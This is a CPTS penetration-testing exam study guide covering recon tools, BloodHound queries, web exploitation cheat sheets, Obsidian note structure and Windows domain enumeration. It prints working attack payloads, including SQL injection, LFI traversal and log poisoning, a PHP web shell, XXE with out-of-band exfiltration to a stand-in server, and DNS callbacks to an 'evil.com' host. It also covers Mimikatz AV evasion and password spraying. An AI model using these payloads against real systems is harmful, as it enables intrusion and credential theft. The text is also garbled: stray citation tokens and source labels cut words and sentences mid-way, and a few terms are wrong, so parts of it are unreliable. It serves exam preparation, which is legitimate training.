CPTS Exam Deep Dive: Optimizing Performance and Reporting
Automated Scripts and Tools for CPTS
In a large Active Directory (AD) environment, leveraging community scripts and tools can save precious time. Below is a curated list of automation aids categorized by phase, with usage tips and caveats:
Reconnaissance & Initial Access: AutoRecon​
GITHUB.COM
 – a multi-threaded recon wrapper that automates Nmap scans and service enumeration (useful for broad port sweeps and quick service detection). It launches targeted scanners (e.g. feroxbuster for HTTP) based on open ports, accelerating discovery​
GITHUB.COM
. ffuf and wfuzz – fast fuzzers for discovering files, directories, and parameters. For example, use ffuf to brute-force web paths: ffuf -u http://site/FUZZ -w wordlist.txt -fc 404 (exclude 404 codes). Caveat: Automated recon tools can produce noise; on exam networks (especially external-facing web apps), ensure you stay in scope and avoid heavy exploits by default (AutoRecon’s default config avoids auto-exploitation)​
GITHUB.COM
. Always supplement with manual probing if something looks odd (no tool finds everything​
GITHUB.COM
).
Web Exploitation: Burp Suite – indispensable for intercepting requests, fuzzing parameters, and manipulating attacks. Community extensions (e.g. Autorize for auth bypass, SQLMap plugin) can speed up testing. SQLMap – automates SQL injection exploitation (time-saving when manual injection yields many results). Commix – automates command injection on web forms. OPSEC: Use these after initial manual testing to confirm findings; blind reliance can waste time (SQLMap might chase false positives). Instead, craft a small set of test payloads for common bugs and automate their trial (e.g. use Burp Intruder to inject '; WAITFOR DELAY '0:0:5'-- for SQLi or & ping -n 1 attacker_host & for OS command injection). Watch out for WAFs—if payloads get blocked, try encoding or alternate syntax (e.g. use %25 encoding for special chars). Example: For a suspected Local File Inclusion, fuzz with encoded traversal sequences: ../../etc/passwd, ..%2f..%2fetc/passwd, etc., and look for telltale strings like “root:x:” in responses. This approach quickly confirms an LFI and bypasses basic filters.
Windows & AD Enumeration: SharpHound/BloodHound – SharpHound collects AD data which you analyze in BloodHound to map attack paths​
BRUNOROCHAMOURA.COM
. This is essential in CPTS for visualizing relations: e.g. shortest paths to Domain Admin, users with SPN (Kerberoast)​
REDFOXSEC.COM
, etc. When to use: after getting an initial foothold with domain user creds or shell, run SharpHound (PowerShell or executable) to enumerate AD. OPSEC: SharpHound can trigger AV; use the stealth collection (-c All --Stealth) if needed, or run from a safe host. A safer alternative is LDAP queries/PowerView – PowerView PowerShell functions can enumerate users, groups, ACLs without binary execution​
BRUNOROCHAMOURA.COM
 (e.g. Get-DomainUser for all users, Find-InterestingDomainAcl for ACL abuse). Keep in mind many PowerView scripts are flagged by Defender. If PowerView is blocked or crashes mid-run, fall back to built-in commands: nltest /dclist:DOMAIN (list domain controllers), net group "Domain Admins" /domain (members of Domain Admins), or use Impacket tools over Python from your Kali. Impacket’s suite (e.g. GetUserSPNs.py, ldapsearch.py, secretsdump.py) is highly valuable​
MOTASEMHAMDAN.MEDIUM.COM
 – for example, use GetUserSPNs.py to find Kerberoastable accounts by querying servicePrincipalNames. Caveat: On very large domains, Impacket’s GetUserSPNs.py may timeout or dump huge data; consider narrowing scope (filter by OU or use -target-domain). A known issue is GetUserSPNs.py hanging on slow networks – if it fails, you can achieve the same via PowerShell: Get-ADUser -Filter 'ServicePrincipalName -like "*/*"' -Properties ServicePrincipalName.
Credential Hunting & Post-Exploitation: Mimikatz – the go-to for harvesting Windows credentials from memory (LSASS). Use it after gaining admin on a box to dump plaintext creds, Kerberos tickets, or perform DC sync. OPSEC: Mimikatz is highly flagged; to evade, run it in-memory (e.g. via Invoke-Mimikatz in PowerShell) or use a safer dumper like rundll32 with a DLL. If Mimikatz is blocked or crashes (common on modern systems with Credential Guard), use alternatives: rubeus (C# tool for Kerberos operations like ticket harvesting, curb roasting)​
BRUNOROCHAMOURA.COM
 or dumpert/nanodump to dump LSASS and then analyze offline with Mimikatz on Kali. LaZagne – post-exploitation tool to search for saved passwords on the target (browsers, Wi-Fi creds, etc.). Run it on compromised endpoints to scrape plaintext creds that users saved. Also consider Seatbelt​
MEDIUM.COM
​
MEDIUM.COM
 – a C# “living off the land” enumerator that finds interesting user data (browser history, Cloud credentials, putty sessions, etc.) with less AV detection. Caveat: Always verify any found credentials by attempting logins – outdated or incorrect creds can mislead your attack path.
Privilege Escalation (Local): WinPEAS & LinPEAS – privilege escalation auditing scripts for Windows and Linux, respectively. These enumerate system configs, vulnerable software, SUID files, misconfigured privileges, etc., in one go​
MEDIUM.COM
​
MEDIUM.COM
. When to use: once you have a low-priv shell on a box and manual checks haven’t immediately revealed an easy win, run PEAS scripts to ensure nothing is missed. OPSEC: They can be noisy (touch many files/processes). On Windows, WinPEAS may trigger Defender; a workaround is using the PowerUp script (a PowerShell priv-escalation tool)​
MEDIUM.COM
 or running WinPEAS’s smaller modules. On Linux, LinPEAS is usually safe to run; still, double-check any exploit suggestion it prints. Windows Exploit Suggester (WES-NG) – feed it the output of systeminfo to get a list of potential Windows kernel or local exploits (e.g. missing patches like Hot Potato, etc.). Linux exploit suggester – similar idea; after uname -a and OS release info, it suggests known kernel CVEs. Caveat: Always confirm kernel versions and exploit compatibility. Relying blindly on automated suggester output can be dangerous – e.g., running the wrong kernel exploit can crash a system (fail open). If an exploit is recommended (say, DirtyPipe for a Linux kernel), read its documentation and ensure kernel build matches before executing.
Active Directory Attacks & Automation: Tools like BloodHound not only enumerate but can automate attack path exploitation. ACLPwn​
GITHUB.COM
, for instance, connects to BloodHound’s Neo4j database and attempts to auto-exploit ACL-based paths to escalate privileges. It can take a BloodHound-identified path (like user has GenericAll on an OU) and perform the steps to grant you higher rights​
GITHUB.COM
. Use with caution: in an exam, automated exploitation might be considered too risky or out-of-scope; use such tools more for verification than initial action. CrackMapExec (CME) – now rebranded as NetExec on HTB​
BRUNOROCHAMOURA.COM
, it’s a Swiss-army knife for Windows network enumeration and exploitation. With one liner you can test credentials across hosts, execute commands on multiple machines, and enumerate shares or user sessions. **Ide​
BRUNOROCHAMOURA.COM
​
BRUNOROCHAMOURA.COM
some credentials – use CME/NetExec to spray them across the network (e.g. netexec -u user -p 'Password123' --local-auth 10.10.10.0/24 to find where they work) and run a command (like dumping SAM). OPSEC: CME’s power can also lock accounts if used for password spraying without care; use --no-bruteforce and respect lockout policies (consult BloodHound for LockoutThreshold). If NetExec/CME fails or crashes (for example, older CME versions had issues with WinRM threads), you can achieve similar results with individual Impacket tools (wmiexec, smbexec, etc.) or PowerShell remoting.
Pivoting & Tunneling: As CPTS often involves pivoting through multiple network segments, tools to create SOCKS proxies and port forwards are vital. Chisel – a fast TCP tunneling tool (client-server) to forward or reverse-forward ports through a compromised host. Ligolo-ng – a newer favorite that provides a stable, encrypted SOCKS5 tunnel​
MEDIUM.COM
. Recommendation: “Use Ligolo-ng from the start”​
MEDIUM.COM
 – it’s more resilient than Chisel (survives pivot host reboots, easier to set up mutual TLS). If Chisel tends to die or requires re-running, switch to Ligolo-ng. Both eliminate the need for clunky proxychains in many cases. When pivoting on Windows, consider Proxifier (GUI tool to route traffic through a proxy) if you need to force a GUI app (like a browser or RDP client) through your tunnel. Also keep handy SSH for classic port forwarding (local and remote) and sshuttle for quick VPN-like routing. Caveat: Not all tools obey proxy settings – e.g., netstat or built-in nslookup on a remote host won’t route through your SOCKS. Test critical tools with your pivot (the proxychains ≠ magic principle​
MEDIUM.COM
). If something ignores your SOCKS proxy, you may need an alternate method (e.g. an actual ssh -L port forward or use Meterpreter portfwd for that specific port).
In summary, automate what is tedious or time-consuming, but remain ready to manual fallback. Each of the above tools can fail under pressure – having multiple options (one script, one manual method) for each task ensures you’r​
GITHUB.COM
ed. Equally important: practice using these tools ahead of time so you’re fluent during the exam. As one CPTS veteran notes, he kept a “mistake log” in his notes to recall what went wrong with tools in the past and why​
MEDIUM.COM
 – this helped avoid repeating those errors under exam conditions.
BloodHound Queries and Efficiency Boosters
BloodHound is invaluable for mapping AD attack paths, but knowing specific queries can speed up your path to Domain Admin (DA). Instead of blindly clicking around the GUI, use targeted Cypher queries or built-in Analysis queries. Key BloodHound queries to streamline CPTS-style AD exploitation include: 

BloodHound graph showing multiple Kerberoastable user paths to Domain Admin (each green n​
BRUNOROCHAMOURA.COM
 a user with an SPN, and edges trace potential privilege escalation routes to the Domain Admins group on the right). Understanding these relationships helps prioritize attacks​
REDFOXSEC.COM
​
REDFOXSEC.COM
.
Find Kerberoastable Users: This reveals service accounts with Service Principal Names (SPNs) – prime targets for offline cracking. Use Cypher: MATCH (u:User) WHERE u.hasspn=true RETURN u.name​
REDFOXSEC.COM
. Run this early, once you have any domain user access, to list accounts for Kerberos roasting. In BloodHound’s GUI, the built-in query “List all kerberoastable users” accomplishes the same. Usage: After dumping SPNs (via GetUserSPNs.py or SharpHound data), prioritize cracking those accounts’ hashes, as they often lead to lateral movement or privilege escalation.
Find AS-REP Roastable Users: Some user accounts have “Do not require Kerberos preauthentication” set, meaning you can request encrypted A​
MEDIUM.COM
s without any credentials. Query: MATCH (u:User {dontreqpreauth: true}) RETURN u.name​
REDFOXSEC.COM
. These accounts (if any) can be attacked with AS-REP roasting (e.g. using Impacket’s GetNPUsers.py). Context: Even a locked-out or disabled user can be AS-REP roasted if this flag is on, so this query might reveal a hidden opportunity for an offline crack.
Admins Currently Logged On (Session Hunting): It’s often fruitful to target machines where high-privilege users are active. BloodHound can show you where Domain Admins have sessions. Query: MATCH (u:User)-[:MemberOf*1..]->(g:Group) WHERE g.objectid ENDS WITH '-512' MATCH p=(c:Computer)-[:HasSession]->(u) RETURN c.name, u.name​
REDFOXSEC.COM
. This finds any computer where a Domain Admin account has a session. If you compromise that computer (even with a normal user), you might extract the DA’s token or credentials from memory. When to use: After an initial foothold, run this to decide which machine to target next for lateral movement (i.e. pivot to a box where an admin is logged in). It’s essentially an attacker’s “VIP list” of hosts.
Local Admin Mapping: Identify which users are local admins on which machines. Query: MATCH (u:User)-[r:AdminTo]->(c:Computer) RETURN u.name, c.name ORDER BY u.name​
REDFOXSEC.COM
. BloodHound’s “Map local admin rights” does this too. Usage: Suppose you compromised User X; this query shows if User X is admin on certain hosts. Those hosts become your next targets (because you can leverage X’s admin rights to fully compromise them). It’s also useful post-DA to see the extent of admin sprawl (which accounts are overly powerful on many systems).
RDP Access Rights: Sometimes any domain user can RDP into certain servers (a misconfiguration). Query: MATCH p=(g:Group)-[:CanRDP]->(c:Computer) WHERE g.objectid ENDS WITH '-513' RETURN p​
REDFOXSEC.COM
. This checks if the Domain Users group (RID 513) has RDP access to computers. If yes, any user (once you have their creds or a shell) could log on interactively to those systems. Usage: If you find such a system, it’s a great pivot – you might not even need to exploit a vulnerability, just use valid creds to RDP in and escalate from there.
Shortest Paths to Domain Admin: BloodHound’s killer feature is finding attack paths. The GUI’s “Shortest Path to Domain Admins” query will highlight the minimal steps from any owned principal to a DA​
SANS.ORG
. For more precision, you can target, say, “Shortest paths from Kerberoastable users to DA”. In the UI, this is a pre-built query: it shows if cracking any SPN account password could immediately grant DA rights (e.g. the SPN user is a direct Domain Admin or has privileges to one)​
SANS.ORG
. Usage: After collecting BloodHound data, run these path queries before spending time on low-impact targets. It helps triage: you might discover that one particular user (with an SPN​
GITHUB.COM
via “AddKeyCredentialLink” or some ACL to Domain Admin – making them your golden goose to crack. Always validate each step of the path in practice (BloodHound assumes default conditions; e.g., HasSession means you still need to dump creds from that session which might require local admin).
Sensitive Accounts and Trusts: Additional handy queries: Find users with PASSWD_NOTREQD (Password not required – sign of potential weak accounts) and Find all Unconstrained Delegation machines (these systems can be used to capture DA tickets if a DA logs into them). While not built-in, you can craft: MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name for the latter. These are more situational but can reveal “low-hanging fruit” config flaws that lead to privilege escalation without exploits.
Before vs. After DA: Prioritize queries that reveal escalation paths before you have DA (the ones above). Once you become Domain Admin, pivot your BloodHound usage to post-DA tasks: identify Tier 0 assets and any trusts. For example, run “Find another domain trusts” if multiple domains exist, or “Shortest path to High Value targets” (where “High Value” might be a custom tag for critical servers like Exchange or SQL). This ensures you fully compromise the environment as required by the exam objectives. Finally, don’t forget the performance aspect: BloodHound can ingest huge AD datasets. Use filters to speed up queries (e.g., target specific OU or omit disabled accounts). And if the GUI is slow, you can query the Neo4j database directly with Cypher (the CompassSecurity repo of custom queries​
GITHUB.COM
 is a great resource). Efficient BloodHound use – running the right queries at the right time – can turn hours​
MEDIUM.COM
 enumeration into minutes of visual insight, letting you focus on execution.
Initial Access Optimization (Web & Network)
The CPTS exam features complex web apps and external network entr​
MEDIUM.COM
ognizing vulnerabilities quickly is crucial. Below is a quick-reference cheat sheet for fuzzing and common exploits (LFI, RCE, XXE, SQLi, command injection), including detection patterns and bypass tricks:
Fuzz Smartly: Use targeted fuzzing to reveal hidden functionality. For files and directories, start with wordlists (like SecLists) in tools like ffuf or dirsearch. Tip: Include extensions in your fuzz (e.g. -e .php,.asp,.txt in ffuf) to catch backup files. Monitor response codes and sizes – not just 200 OK. A 302 redirect or a 500 error can signal a hit (e.g., LFI might throw a 500 when a file include fails). Also fuzz HTTP parameters for content discovery: a tool like ffuf can fuzz parameter names and values (ffuf -u http://site/page.php?FUZZ=test -w params.txt -fw 0 to find usable parameters by looking for responses differing from baseline). Bypass trick: If a filter blocks your fuzz (e.g., WAF), try manipulating case or using an alternate Host header (some web apps respond differently to Host: localhost).
LFI (Local File Inclusion):
LFI (Local File Inclusion): Look for parameters like file=, path=, page= – these often indicate inclusion. A quick test is to input ../../../../etc/passwd (for *nix) or ..\..\boot.ini (Windows). Detection pattern: if the response contains fragments like root:x: or [boot loader], you have an LFI. Even an error message like “failed to open stream” with a file path is a clue. Bypass tricks: If ../ sequences are blocked, double URL-encode them (%252e%252e%252f = ../). Append a null byte (%00) to bypass extensions in very old PHP apps (e.g., file=../../shell.php%00.jpg). Utilize PHP wrappers for edge cases (e.g., php://filter/convert.base64-encode/resource=... to read source code). Fast wins: Try common files (/etc/passwd, /windows/win.ini) and the app’s config file (often /var/www/html/config.php). If you get an LFI, consider LFI to RCE via log poisoning: for instance, if you can inject PHP code into an access log (by making a user-agent <?php system($_GET['c']);?>) and then include the log file, you gain RCE. This multi-step attack is time-consuming though – pursue it only if needed for a foothold.
RCE & Command Injection: These occur when user input is executed as system commands. Common spots: form fields that might call shell scripts (ping, traceroute, file upload processing). Detect quickly: Insert a command separator like ; or && in a parameter. Example: if a page has a host lookup form, try google.com; whoami. If output is reflected (e.g., “root” in response), you have RCE. Many times output won’t be shown; use a timing side-channel – e.g. append ; ping -c 3 127.0.0.1 (observe delay) or for Windows & timeout /T 5. The delay confirms code execution even without output. Another trick: trigger DNS queries to yourself (nslookup yourdns.evil.com) and watch your DNS server logs. Bypasses: 
BRUNOROCHAMOURA.COM
filtered, use ${IFS} (internal field separator) in Linux or concatenate commands (ping$IFS-c$IFS1). If certain chars are blocked, try others (| or %0a newline instead of ;). Sometimes parameters are wrapped in quotes server-side, so injecting ";whoami;" can break out. Time-saver: Maintain a shortlist of payloads for different OS – e.g., ;whoami, &whoami (Linux/Windows) and | id for good measure – and test them in one go via a Burp Intruder cluster bomb. Also remember web RCE can come from file uploads (uploading a web shell .asp,.php etc.). If you find an upload function, attempt to upload a simple webshell (like PHP <?php system($_GET['c']); ?>). If the file type is restricted, try double extensions (shell.php.jpg) or MIME type tricks. Quickly locating an upload and getting a shell is often the fastest path to initial access in web apps.
XXE (XML External Entity injection): If you encounter an XML input (e.g., file upload using XML, SAML authentication, SOAP API), suspect XXE. To test safely, send a minimal malicious XML payload. For example:
xml
Copy
Edit
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
If the response includes “root:x:” (for /etc/passwd), you’ve succeeded. If not, look for error messages about entities. Blind XXE detection: Use an external request. Define <!ENTITY xxe SYSTEM "http://<YOUR-SERVER>/abc"> and in the XML use &xxe;. If your server logs an incoming request to /abc, the XXE worked (even if you can’t read files directly, this confirms vulnerability). Bypass: Some parsers disallow the older SYSTEM entity but allow newer techniques (like using <image> tags in SVG files or forcing error messages via <!ENTITY % ext SYSTEM "file://...">). If direct file retrieval is blocked, consider out-of-band exfiltration: e.g., SYSTEM "http://yourserver.com/?q=%25{FILE_CONTENT}%25". Quick recognition: Many XXE payloads require trial and error, so note app behavior – if providing a normal XML yields one result but adding a doctype yields a different error or delay, you might be on track. Also inspect any XML-based functionality (like exporting data) for odd output that could be file contents. Given the time, leverage ready-made XXE payload cheat sheets (like the one from OWASP) – copy a small payload and observe; it’s faster than crafting from scratch.
SQL Injection: The classic SQLi can be a quick win for dumping creds or getting RCE via database features. Fast detection: Try a simple ' (single quote) in text inputs – a SQL error like “syntax error” or “unclosed quote” confirms a vulnerability. In a login form, use ' OR '1'='1 in the username or password – if you get logged in as an admin, it was wide open. For blind SQLi (no visible errors), use boolean tests: e.g., add OR 1=1-- versus OR 1=2-- to see if page content changes. Timing attacks are another fallback: '; SELECT pg_sleep(5)-- for PostgreSQL or '; WAITFOR DELAY '0:0:5'-- for MSSQL – the page hanging for 5 seconds is a positive sign. Extraction tips: Once confirmed, find the number of columns with ORDER BY or UNION SELECT NULL,.... Then use UNION SELECT to dump data like usernames and password hashes (often from users table). Focus on tables relevant to auth or any credentials. Bypass techniques: If quotes are filtered, use CHAR codes (e.g., CHAR(97) for 'a') or concatenate with + for MS SQL. If a WAF blocks common terms, use case variation or comments: UNunionION SELselectECT. Leveraging SQLMap can save time if the injection is complex – it will automate data extraction, but be m​
BRUNOROCHAMOURA.COM
 time (SQLMap can be slow on blind injections; use its --tamper scripts if facing a WAF). Pro tip: Many web apps have SQLi only in certain parameters – fuzz all GET and POST params with a single quote using Burp Intruder and look for differences. Often, one parameter out of many might throw a SQL error. Catch it, exploit it, and move on quickly.
Command Injection vs. SQLi vs. LFI – recognizing the vulnerability: Sometimes an app might show ambiguous errors. A tip for quickly distinguishing: SQLi errors often mention SQL syntax or database driver names (e.g. “ODBC” or “SQLite” or line numbers in a SQL query). LFI issues might show file paths or PHP include errors. Command injection often has no error at all – so if input causes a freeze or significantly slower response, lean towards injection and test with a harmless command like && echo SUCCESS. The ability to tell these apart from their symptoms will save time – you won’t chase a false lead (e.g., mistaking an LFI for a crash). When in doubt, go through a checklist: add a ' – any SQL error? If not, add ;echo TEST – does “TEST” appear? If not, try an LFI payload – any file content? This methodical approach can identify the vuln type within a minute.
Time-saving heuristics for vulnerable apps: Leverage what you know about the tech stack. If phpinfo() output or an error reveals the se​
BRUNOROCHAMOURA.COM
ocus on LFI, file upload, or deserialization bugs. If it’s .NET/IIS, test for verbose SQL errors or authentication bypasses. Use tools like WhatWeb/Wappalyzer early to fingerprint frameworks (e.g., an “X-Powered-By: Express” header hints at Node.js – maybe NoSQL injection or prototype pollution). During enumeration, note any default credentials possibilities (e.g., Tomcat manager, Jenkins, etc. from the Bruno’s CPTS prep list【10†L151-L160】【10†L163-L172】). Sometimes the fastest “exploit” is just admin:admin on an old web interface. In practice, CPTS exam targets often mix web vulns and misconfigurations, so apply this cheat 
BRUNOROCHAMOURA.COM
ally: for each web app, perform a quick sweep with these tricks. A few minutes of smart fuzzing and test payloads can reveal a critical weakness that gets you initial foothold.
Efficient Obsidian Usage and Structure
Proper note-taking can make or break your exam performance. Obsidian, a markdown-based note app, is ideal for organizing CPTS prep materials and live exam notes. Here’s how to structure your vault for maximum efficiency, along with templates and tips to speed up usage during the exam:
Vault Organization: Create a vault structure that separates reference materials from engagement-specific notes. For example:
bash
Copy
Edit
CPTS-Vault/
├── 00_Reference_Cheatsheets/
│   ├── WebExploitation.md
│   ├── AD_Attacks.md
│   ├── PrivEsc_Windows.md
│   ├── PrivE&#8203;:contentReference[oaicite:44]{index=44}│   └── ... (more topic-wise cheatsheets)
├── 01_Templates/
│   ├── Host_Enum_Template.md
│   ├── Exploit_Writeup_Template.md
│   ├── Report_Finding_Template.md
│   └── GotThis_DoThat.md
├── 02_Practice_Labs/
│   ├── AEN_Lab_Notes.md
│   └── [Other lab or HTB box notes].md
└── 03_Exam_Engagement/
    ├── Host1_Foothold.md
    ├── Host1_PrivEsc.md
    ├── Host2_Pivot.md
    ├── ... etc ...
    └── Final_Report_Draft.md
Explanation: The Reference_Cheatsheets holds your pre-built knowledge (commands, techn​
MEDIUM.COM
emplatesfolder contains note templates for quickly jotting down common structures.Practice_Labscan hold notes from your prep work (like the Attacking Enterprise Networks lab, ProLabs, etc., treated as mini engagements).Exam_Engagement` is where you’ll create notes during the actual CPTS exam – one note per host or per major phase. By separating these, you ensure that during the exam you’re not wading through unrelated info; you have your clean workspace plus the reference section readily available.
Templates for Speed: Setting up Obsidian templates (with the Templater plugin【5†L221-L229】) will let you insert pre-formatted content with a hotkey. Key templates to prepare:
Exploit Writeup Template: A note blueprint for documenting a found vulnerability. Include headings like Description, Affected Host/Service, Steps to Reproduce, Exploit Code/Payload, Outcome (Flag or Shell), Mitigation. Having this ready means the moment you discover a vuln (say SQLi), you hit your template hotkey and fill in the details. This ensures your notes capture everything needed for the report later.
“Got This? Do That!” (If-Then) Workflow: This is essentially a decision-tree in text form – a quick lookup guide for next steps. Format it as a table or bullet list, e.g.: “Got credentials 
BRUNOROCHAMOURA.COM
rack with John/Hashcat【49†L234-L243】. Got low-priv shell on Windows? Do WinPEAS & whoami /priv. Got SeImpersonatePrivilege? Do JuicyPotato or PrintSpoofer.” Cover common scenarios. During the exam, when you encounter something (like discovering a user is in DnsAdmins group), refer to this note: it should remind you “DnsAdmins → can install DLL as system (DNSAdmin exploit)”. This reduces analysis paralysis and saves mental energy.
Cheatsheets: Break these down by topic and service. For instance, have a ready list of pspy usage for cron jobs, common misconfig commands (Windows registry autoruns, Linux sudoers quirks), etc. You might already have these from your prep; Obsidian just makes them easily searchable. Use clear headings in each cheatsheet so you can Ctrl+O (Quick Switcher) and type “MySQL injection” or “Linux SUID” to jump right there. One effective approach is what one CPTS taker did: 100+ notes organized by phase【35†L180-L189】 (Recon, Exploitation, Post-Exploitation, Pivoting, Reporting), each containing use cases, syntax, command variations, and even past mistake logs. That way, whatever phase you’re in, you open that note and have a checklist at hand.
Reporting Components: It helps to have a template for the final report or at least the key sections. For example, a Flags Captured template – a table listing each target, flags or proof files found, and brief description (so you don’t forget any objectives). Also a Privilege Escalation Paths template – where you note each pivot (user X → admin on Host Y → dumps cred of User Z → etc.). This will greatly help when writing the narrative of the report. Additionally, have a Mitigations snippets list (common fixes for vulns) so you can quickly add those to report findings. The idea is to minimize writing from scratch under time pressure.
Folder Layout for 
MEDIUM.COM
ts: During an actual pentest (or the exam, which is an extended assessment), mirror your methodology. For instance, inside Exam_Engagement/Host1_Foothold.md, you might have sections: Recon, Exploitation, Post-Exploitation for that host. In Host2_Pivot.md, note how you got there (credentials used or exploit), and so on. Maintaining separate notes per host helps when you need to recall “how did I get access to this machine?” – you’ll have it n​
BRUNOROCHAMOURA.COM
ed. Also consider a top-level Engagement Journal.md where you log a timeline of actions (timestamped entries of what you attempted when). This can be as simple as bullet points with times. It serves two purposes: keeping you on track and providing a sanity-check log if you need to retrace steps.
Speed Tips for Obsidian during Exam: Familiarize yourself with Obsidian’s core features:
Quick Switcher: By pressing Ctrl+O (or your custom key), you can fuzzy-search any note title. This is incredibly fast for pulling up cheatsheets. For example, typing “priv esc win” could immediately bring up your Windows PrivEsc note.
Backlinks and Index: Maintain an index note (could be your vault homepage) with links to all major references. Or use a pinned note that serves as your personal index (“Start Here”). For instance, your index note might list: Web Exploitation (link), Network Enum (link), BloodHound Queries (link), etc., acting as a visual menu. Having this open in one pane while you work in another can save search time.
Pinning & Splitting: Pin important notes (right-click the tab -> Pin). E.g., pin your GotThis_DoThat.md and maybe your Flags note. This way you won’t accidentally close them. Use split view to see two notes side by side (Obsidian allows multip​
BRUNOROCHAMOURA.COM
great combo is reference on one side, current attack notes on the other.
Templater Hotkeys: As mentioned, set hotkeys for inserting templates (Obsidian supports Alt+E for template selection with the plugin【5†L225-L228】). Practice this: e.g., when you land a shell, immediately use your “Host_Enum_Template” to jot down kernel version, whoami, ipconfig, etc., so you systematically capture key info for each host. This reduces the chance of missing something like forgetting to note the IP or OS version which you’ll need later.
Daily Notes or Scratchpad: Consider enabling a daily note feature – each day of the exam you get a note (e.g., “Day3.md”) where you can do quick scribbles, brain dumps, or task lists. This can serve as a mini-agenda: e.g. “To-do: exploit SQLi on app1, crack AS-REP hash, run BloodHound on DC02”. Checking them off feels good and keeps you organized over the exam’s multiple days.
Search within notes: Use Ctrl+F in Obsidian to search the current note, and the global search for vault-wide grep. For example, if you recall writing down an exploit but can’t find it, global search a keyword. The speed of text search in Obsidian is great 
BRUNOROCHAMOURA.COM
cating that one command you used in practice but forgot.
Improving quick reference: Utilize wiki links in Obsidian. Link related no​
BRUNOROCHAMOURA.COM
te Name]]`. For example, in your AD cheatsheet, if you mention Kerberoasting, link it to a detailed Kerberoast step-by-step note. During the exam, this creates a web of knowledge you can traverse with clicks rather than hunting manually. Some users create a “graph of concepts” so they visualize connections – while the graph view is cool, in an exam you’ll likely stick to the search and links. Still, it’s there if you need to see, for instance, all notes connected to “Active Directory”.
Lastly, practice your note-taking workflow. During CPTS preparation labs, simulate exam conditions and use Obsidian exclusively for notes【35†L223-L232】. By exam day, it should feel second nature. One CPTS graduate mentioned that during the exam his Obsidian “field manual” was his only reference – no searching the web, just him and his notes【35†L194-L200】. That’s the confidence you want: trust your Obsidian vault as your external brain. This not only improves speed but also reduces stress, since you know exactly where to find that crucial command or syntax when you need it.
Manual vs. Automated Windows Enumeration
When inside a Windows domain environment, you’ll gather information either manually (built-in commands, custom scripts) or via automated tools (PowerView, SharpHound, etc.). Both approaches have merits. The key is to use each method’s strength under exam time constraints:
PowerView (Manual-ish via PowerShell): PowerView (part of PowerSploit) is a collection of PowerShell functions for AD enumeration – e.g. Get-NetUsers, Get-NetGroup -AdminCount 1 (find privileged users), Find-LocalAdminAccess (where current user is local admin). Using PowerView is almost manual because you choose exactly which queries to run. Pros: Granular control; you can query specific info stealthily (useful if the environment has detection – though in an exam, “stealth” is less concern, but reliability is). If you suspect a particular misconfiguration, a targeted PowerView query might surface it faster than sifting through BloodHound graphs. Cons: It’s slower to cover everything – you might miss an attack path if you don’t run the right function. Also, modern defenses often flag PowerView usage (its signatures are well-known). If PowerView is causing script block logs or outright being deleted by Defender, you may need to encode it or switch to an alternative like SharpView (a C# port of PowerView that can sometimes slip past AV). In the exam, running PowerView is fine if you’ve got an execution method (like PowerShell session), but be prepared for it to possibly error out on very large domains (e.g., Get-NetComputer listing thousands of machines may be slow).
SharpHound (Automated via BloodHound): SharpHound will automatically collect a broad set of AD data (users, groups, ACLs, sessions, trusts, etc.) and output JSON for BloodHound analysis. Pros: Comprehensive – it finds things you didn’t even know to look for (like that one user with GenericAll on an OU). It’s a huge time-saver to reveal complex multi-step paths (e.g., user → to group → has sessions → on server → admin to domain). In CPTS, where AD is a big focus, this can be your “find everything” button. Cons: It can be overkill; the data dump might be large and take time to sift (thus knowing queries as above helps). Also, running SharpHound in full collection mode can be noisy and sometimes troublesome to execute (e.g., requires .NET and domain connectivity on the compromised host; in one case if run from a non-domain box with just credentials, you’d use the Python BloodHound or run SharpHound with explicit domain controller targeting). In exam conditions, the trade-off is usually worth it: run SharpHound early so you don’t overlook an easy win (like a forgotten “Password in Description” attribute【49†L228-L236】). If SharpHound isn’t feasible (no GUI to analyze or no execution on target), then rely on manual methods.
Built-in Manual Commands: These include using net commands (net user username /domain, net group "Domain Admins" /domain), WMI queries, nltest, and the ActiveDirectory PowerShell module (if available). For instance, nltest /domain_trusts lists trust relationships – a quick manual check that SharpHound would also give you but perhaps later. whoami /groups on a compromised user tells you if they’re in any interesting AD group (sometimes an account might surprisingly be in Backup Operators or Account Operators, etc., which are escalation vectors). Pros: 100% OPSEC safe (just looks like normal admin commands), and no dependencies. Also, manual output is right in front of you to copy into notes. Cons: It’s piecemeal; you have to know what to look for. The exam might hide a clue that only a specific command reveals (e.g., a user’s description contains a password – PowerView’s Find-UserField would catch it, but manually you’d have to enumerate all users and inspect descriptions – doable with net user /domain but very tedious unless scripted).
Reducing overhead with fast aliases & scripts: Given the time crunch, you can prepare a “one-liner” enumeration script (a batch or PowerShell script) that runs a bunch of quick checks and prints results. For example, a PowerShell one-liner could: list current user groups, list local admins, list domain admins, check the domain password policy, and find any SPNs:
powershell
Copy
Edit
whoami /priv; net localgroup administrators; net group "Domain Admins" /domain; net accounts /domain; powershell -c "Import-Module ActiveDirectory; Get-ADUser -Filter {ServicePrincipalName -ne $null} -Properties ServicePrincipalName | Select Name,ServicePrincipalName"
This is a bit messy but demonstrates hitting many points at once. You could execute such a script after getting a shell to quickly dump vital info. Alternatively, use tools like WinPEAS in “enum domain” mode (if run on a domain-joined machine with some privileges, it will enumerate domain info too). Another trick: leverage CrackMapExec/NetExec for enumeration. CME can pull list of users, groups, and even identify misconfigs in one sweep (e.g., cme smb <DC-IP> -u <user> -p <pass> --users --groups --password-policy). That’s automated enumeration from your attacker machine without needing to run scripts on the target. It’s fast and gives results in one place. Caveat: CME’s output might be overwhelming; but if you’re comfortable with it, it’s a huge time-saver. For example, CME will plainly tell you “[*] Dumping password policy” and “Lockout threshold: 5” etc., which you’d otherwise get via net accounts /domain. Manual vs Automated in practice: A balanced approach in CPTS is often: run a broad automated collection early (SharpHound) while doing manual quick checks in parallel. For instance, once you pop an initial shell, you could start SharpHound and in the meantime manually check “low-hanging fruit” – is this user a local admin somewhere (try a simple lateral movement with their creds), any accessible shares (net view \\\\fileserver\\), any plaintext creds on the box (search for password in config files). Manual enumeration shines in these immediate areas (often the exam planted an obvious clue like an unattend.xml with creds, or a share with a config file). Automated enumeration shines in mapping the whole AD which is crucial for the endgame. Finally, note that the exam emphasizes manual skills – the CPTS course explicitly stresses manual enumeration【49†L289-L296】. This means as a candidate you should not solely rely on running one script and calling it a day. Use the automated tools to augment, not replace, your own enumeration. Cross-verify critical findings manually. If 